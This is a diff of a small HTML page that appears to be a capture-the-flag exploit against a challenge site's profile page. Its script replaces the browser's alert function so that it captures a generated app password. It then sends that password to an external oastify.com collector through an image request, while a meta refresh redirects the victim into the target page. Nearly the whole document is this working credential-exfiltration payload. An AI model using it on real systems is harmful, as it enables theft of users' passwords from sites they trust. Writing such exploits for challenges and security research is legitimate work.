@@ -1,14 +1,20 @@
+
 <!DOCTYPE html>
 <html>
   <head>
     <script>
+      // 1) Override alert to catch the password
       window.alert = function(msg) {
-        const pw = msg.match(/App password generated: (.+)/)?.[1];
-        if (pw) {
-          new Image().src = "https://uhfn61cb0fplpfsd7u669n1by24tslk99.oastify.com/leak?pw=" + encodeURIComponent(pw);
+        const m = msg.match(/App password generated: (.+)/);
+        if (m) {
+          new Image().src =
+            "https://4x2xmbslgp5v5p8nn4mgpxhleck38v1jq.oastify.com/leak?pw=" +
+            encodeURIComponent(m[1]);
         }
       };
     </script>
-    <meta http-equiv="refresh" content="0;url=https://airbnb-hosts-2847774775fe-link-sheriff-0.chals.io/profile">
+    <!-- 2) Immediately redirect into the real profile page -->
+    <meta http-equiv="refresh"
+          content="0;url=https://airbnb-hosts-2847774775fe-link-sheriff-0.chals.io/profile">
   </head>
 </html>
